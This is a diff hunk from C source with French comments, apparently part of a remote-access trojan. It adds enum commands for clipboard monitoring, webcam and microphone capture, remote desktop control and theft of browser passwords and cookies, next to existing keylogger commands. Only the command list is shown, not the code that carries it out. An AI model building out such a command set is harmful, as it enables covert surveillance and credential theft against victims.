@@ -97,6 +97,16 @@ typedef enum {
     CMD_KEYLOG_START,   /* Démarre le keylogger */
     CMD_KEYLOG_STOP,    /* Arrête le keylogger */
     CMD_KEYLOG_DUMP,    /* Récupère les frappes */
+    CMD_CLIPBOARD_START,/* Démarre le moniteur presse-papier */
+    CMD_CLIPBOARD_STOP, /* Arrête le moniteur presse-papier */
+    CMD_CLIPBOARD_DUMP, /* Récupère le presse-papier */
+    CMD_WEBCAM_SNAP,    /* Capture une image webcam */
+    CMD_MIC_RECORD,     /* Enregistre le microphone */
+    CMD_DESKTOP_CAPTURE,/* Capture d'écran bureau distant */
+    CMD_DESKTOP_MOUSE,  /* Injection souris */
+    CMD_DESKTOP_KEY,    /* Injection clavier */
+    CMD_BROWSER_CREDS,  /* Extraction passwords navigateur */
+    CMD_BROWSER_COOKIES,/* Extraction cookies navigateur */
     CMD_MAX
 } command_type_t;
 
